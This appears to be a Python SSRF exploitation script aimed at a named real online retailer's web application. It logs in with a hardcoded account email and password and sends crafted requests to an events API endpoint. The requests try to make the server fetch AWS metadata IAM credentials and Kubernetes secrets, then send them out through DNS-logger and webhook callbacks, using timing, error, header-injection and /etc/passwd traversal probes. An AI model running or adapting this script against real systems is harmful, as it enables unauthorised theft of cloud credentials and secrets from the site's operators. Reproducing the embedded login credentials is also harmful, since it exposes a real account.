#!/usr/bin/env python3
"""
Get REAL Impact from SSRF - DNS Exfiltration & OOB Extraction
Goal: Extract actual data (IAM credentials, K8s secrets) to prove real impact
"""

import requests
import json
import time
import re
import urllib.parse
from datetime import datetime
from urllib.parse import quote
import urllib3
urllib3.disable_warnings()

class RealImpactExtractor:
    def __init__(self, base_url, cookies=None):
        self.base_url = base_url
        self.session = requests.Session()
        if cookies:
            self.session.cookies.update(cookies)
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
        })
        self.critical_findings = []
        
    def login(self):
        """Login to get session cookies"""
        print("[*] Logging in...")
        ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
        AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
        
        try:
            params = {
                "response_type": "code",
                "client_id": "shop-myzooplus-prod-zooplus",
                "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login",
                "state": "pentest",
                "login": "true",
                "ui_locales": "de-DE",
                "scope": "openid"
            }
            r1 = self.session.get(AUTH_URL, params=params, timeout=10, verify=False)
            m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
            if m:
                action = m.group(1).replace("&amp;", "&")
                if not action.startswith("http"):
                    action = urllib.parse.urljoin(r1.url, action)
                r2 = self.session.post(
                    action,
                    data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""},
                    timeout=10,
                    verify=False,
                    allow_redirects=False
                )
                loc = r2.headers.get("Location", "")
                if loc:
                    self.session.get(loc, timeout=10, verify=False, allow_redirects=True)
                    self.session.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
                    self.session.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
                    print("[+] Login successful!")
                    return True
        except Exception as e:
            print(f"[!] Login error: {e}")
        return False
        
    def log_critical(self, title, details, data=None):
        finding = {
            "timestamp": datetime.now().isoformat(),
            "severity": "CRITICAL",
            "title": title,
            "details": details,
            "data": data
        }
        self.critical_findings.append(finding)
        print(f"\n[🔥 CRITICAL] {title}")
        print(f"   {details}")
        if data:
            print(f"   Data: {data[:200]}...")
            
    def test_dns_exfiltration(self, dns_logger=None):
        """Try DNS exfiltration to get data from AWS Metadata and K8s API"""
        print("\n[1] DNS EXFILTRATION TEST...")
        print("=" * 70)
        
        if not dns_logger:
            print("[!] No DNS logger provided. Using placeholder.")
            print("[!] Get DNS logger from: dnslog.cn, interactsh.com, or burpcollaborator")
            print("[!] Example: your-subdomain.dnslog.cn")
            dns_logger = "YOUR-SUBDOMAIN.dnslog.cn"  # Placeholder
            
        # Targets to exfiltrate
        targets = [
            {
                "name": "AWS Instance ID",
                "url": "http://169.254.169.254/latest/meta-data/instance-id",
                "dns_format": f"http://{{data}}.{dns_logger}"
            },
            {
                "name": "AWS IAM Role",
                "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "dns_format": f"http://{{data}}.{dns_logger}"
            },
            {
                "name": "K8s Pods",
                "url": "https://kubernetes.default.svc/api/v1/namespaces/default/pods?limit=1",
                "dns_format": f"http://{{data}}.{dns_logger}"
            },
            {
                "name": "K8s Secrets",
                "url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets?limit=1",
                "dns_format": f"http://{{data}}.{dns_logger}"
            },
        ]
        
        for target in targets:
            print(f"\n[*] Trying to exfiltrate: {target['name']}")
            
            # Method 1: Try to inject data into DNS query via URL
            try:
                # Try to make the target URL trigger DNS lookup with data
                test_url = f"http://test-{target['name'].lower().replace(' ', '-')}.{dns_logger}"
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={"url": test_url},
                    timeout=10
                )
                print(f"   Test DNS query: {resp.status_code}")
            except Exception as e:
                pass
                
            # Method 2: Try to redirect to DNS logger with data
            try:
                # Try to make internal service redirect to DNS logger
                redirect_url = f"http://{dns_logger}/?data={{target_data}}"
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": target['url'],
                        "headers": {
                            "X-Forwarded-For": f"http://{dns_logger}",
                            "X-Callback": f"http://{dns_logger}",
                            "Location": f"http://{dns_logger}"
                        }
                    },
                    timeout=10
                )
                print(f"   Redirect attempt: {resp.status_code}")
            except Exception as e:
                pass
                
        print(f"\n[!] Check DNS logs at: {dns_logger}")
        print(f"[!] If you see data in DNS logs = REAL IMPACT!")
        
    def test_oob_extraction(self, webhook_url=None):
        """Try Out-of-Band extraction via webhook"""
        print("\n[2] OUT-OF-BAND (OOB) EXTRACTION TEST...")
        print("=" * 70)
        
        if not webhook_url:
            print("[!] No webhook URL provided. Using placeholder.")
            print("[!] Get webhook from: webhook.site, requestbin.com")
            print("[!] Example: https://webhook.site/your-unique-id")
            webhook_url = "https://webhook.site/YOUR-UNIQUE-ID"  # Placeholder
            
        targets = [
            {
                "name": "AWS Instance ID",
                "url": "http://169.254.169.254/latest/meta-data/instance-id"
            },
            {
                "name": "AWS IAM Role",
                "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            },
            {
                "name": "K8s Pods",
                "url": "https://kubernetes.default.svc/api/v1/namespaces/default/pods?limit=1"
            },
            {
                "name": "K8s Secrets",
                "url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets?limit=1"
            },
        ]
        
        for target in targets:
            print(f"\n[*] Trying OOB extraction: {target['name']}")
            
            # Method 1: Try to send data via headers
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": target['url'],
                        "headers": {
                            "X-Callback-URL": webhook_url,
                            "X-Forwarded-For": webhook_url,
                            "X-Webhook": webhook_url,
                            "X-Notify": webhook_url
                        }
                    },
                    timeout=10
                )
                print(f"   Header method: {resp.status_code}")
            except Exception as e:
                pass
                
            # Method 2: Try to send data via redirect
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": target['url'],
                        "headers": {
                            "Location": webhook_url,
                            "X-Redirect": webhook_url
                        }
                    },
                    timeout=10
                )
                print(f"   Redirect method: {resp.status_code}")
            except Exception as e:
                pass
                
            # Method 3: Try to send data via query parameters
            try:
                # Try to make internal service send data to webhook
                webhook_with_data = f"{webhook_url}?data={{target_data}}"
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": target['url'],
                        "headers": {
                            "X-Callback": webhook_with_data
                        }
                    },
                    timeout=10
                )
                print(f"   Query method: {resp.status_code}")
            except Exception as e:
                pass
                
        print(f"\n[!] Check webhook at: {webhook_url}")
        print(f"[!] If you see data in webhook = REAL IMPACT!")
        
    def test_timing_based_extraction(self):
        """Try timing-based extraction (if response time differs based on data)"""
        print("\n[3] TIMING-BASED EXTRACTION TEST...")
        print("=" * 70)
        
        # Try to detect if response time differs based on data content
        targets = [
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ]
        
        for target in targets:
            print(f"\n[*] Testing timing: {target}")
            times = []
            
            for i in range(5):
                try:
                    start = time.time()
                    resp = self.session.post(
                        f"{self.base_url}/zootopia-events/api/events/sites/1",
                        json={"url": target},
                        timeout=10
                    )
                    elapsed = time.time() - start
                    times.append(elapsed)
                    print(f"   Request {i+1}: {elapsed:.3f}s")
                except Exception as e:
                    pass
                    
            if times:
                avg_time = sum(times) / len(times)
                print(f"   Average time: {avg_time:.3f}s")
                if max(times) - min(times) > 0.5:
                    print(f"   [!] Significant time variation detected!")
                    self.log_critical(
                        "Timing Variation Detected",
                        f"Response time varies for {target}",
                        {"times": times, "variation": max(times) - min(times)}
                    )
                    
    def test_error_based_extraction(self):
        """Try error-based extraction (if errors contain data)"""
        print("\n[4] ERROR-BASED EXTRACTION TEST...")
        print("=" * 70)
        
        # Try to trigger errors that might contain data
        error_triggers = [
            # Invalid URLs that might cause errors with data
            "http://169.254.169.254/latest/meta-data/instance-id/../../etc/passwd",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/../../etc/passwd",
            "https://kubernetes.default.svc/api/v1/namespaces/default/secrets/../../etc/passwd",
            
            # Invalid methods
            {"url": "http://169.254.169.254/latest/meta-data/instance-id", "method": "DELETE"},
            {"url": "http://169.254.169.254/latest/meta-data/instance-id", "method": "PUT"},
        ]
        
        for trigger in error_triggers:
            try:
                if isinstance(trigger, dict):
                    resp = self.session.post(
                        f"{self.base_url}/zootopia-events/api/events/sites/1",
                        json=trigger,
                        timeout=10
                    )
                else:
                    resp = self.session.post(
                        f"{self.base_url}/zootopia-events/api/events/sites/1",
                        json={"url": trigger},
                        timeout=10
                    )
                    
                # Check if error message contains data
                if resp.status_code != 200:
                    if resp.text and len(resp.text) > 10 and resp.text != "{}":
                        # Check if error contains interesting data
                        if any(keyword in resp.text.lower() for keyword in ["instance", "role", "secret", "token", "credential"]):
                            self.log_critical(
                                "Error-Based Data Leak",
                                f"Error response contains data: {trigger}",
                                {"status": resp.status_code, "response": resp.text[:500]}
                            )
            except Exception as e:
                pass
                
    def test_header_injection_extraction(self):
        """Try to inject headers that might leak data"""
        print("\n[5] HEADER INJECTION EXTRACTION TEST...")
        print("=" * 70)
        
        targets = [
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "https://kubernetes.default.svc/api/v1/namespaces/default/secrets?limit=1",
        ]
        
        # Try various header injection techniques
        injection_headers = [
            {"X-Forwarded-Host": "evil.com"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/test"},
            {"X-Rewrite-URL": "/test"},
            {"X-Original-Host": "evil.com"},
        ]
        
        for target in targets:
            for headers in injection_headers:
                try:
                    resp = self.session.post(
                        f"{self.base_url}/zootopia-events/api/events/sites/1",
                        json={
                            "url": target,
                            "headers": headers
                        },
                        timeout=10
                    )
                    
                    # Check if any response headers contain data
                    for header_name, header_value in resp.headers.items():
                        if any(keyword in header_value.lower() for keyword in ["instance", "role", "secret", "token", "credential", "i-"]):
                            self.log_critical(
                                "Header Data Leak",
                                f"Found data in header {header_name}",
                                {"header": header_name, "value": header_value, "target": target}
                            )
                except Exception as e:
                    pass
                    
    def run_all_tests(self, dns_logger=None, webhook_url=None):
        """Run all extraction tests"""
        print("\n" + "=" * 70)
        print("REAL IMPACT EXTRACTION - DNS & OOB TECHNIQUES")
        print("=" * 70)
        print("\nGoal: Extract actual data to prove REAL impact")
        print("=" * 70)
        
        # Login if needed
        if not self.session.cookies:
            self.login()
            
        # Run all tests
        self.test_dns_exfiltration(dns_logger)
        self.test_oob_extraction(webhook_url)
        self.test_timing_based_extraction()
        self.test_error_based_extraction()
        self.test_header_injection_extraction()
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"logs/real_impact_extraction_{timestamp}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(self.critical_findings, f, indent=2, ensure_ascii=False)
            
        print("\n" + "=" * 70)
        print(f"[+] Results saved to: {output_file}")
        print(f"[+] Critical findings: {len(self.critical_findings)}")
        print("=" * 70)
        
        if self.critical_findings:
            print("\n🔥 CRITICAL FINDINGS - REAL IMPACT DETECTED:")
            for i, finding in enumerate(self.critical_findings, 1):
                print(f"\n{i}. {finding['title']}")
                print(f"   {finding['details']}")
                if finding.get('data'):
                    print(f"   Data: {str(finding['data'])[:300]}")
        else:
            print("\n[!] No critical data extracted in this run.")
            print("[!] Check DNS logs and webhook manually!")
            print("[!] DNS/OOB extraction requires external services.")
            
        return self.critical_findings

if __name__ == "__main__":
    import sys
    
    base_url = "https://www.zooplus.de"
    
    # Get DNS logger and webhook from command line or use placeholders
    dns_logger = None
    webhook_url = None
    
    if len(sys.argv) > 1:
        dns_logger = sys.argv[1]
    if len(sys.argv) > 2:
        webhook_url = sys.argv[2]
        
    extractor = RealImpactExtractor(base_url)
    findings = extractor.run_all_tests(dns_logger, webhook_url)
    
    print("\n" + "=" * 70)
    print("NEXT STEPS:")
    print("=" * 70)
    print("1. Get DNS logger: dnslog.cn, interactsh.com, or burpcollaborator")
    print("2. Get webhook: webhook.site or requestbin.com")
    print("3. Run: python get_real_impact_ssrf.py <dns_logger> <webhook_url>")
    print("4. Check DNS logs and webhook for extracted data")
    print("=" * 70)





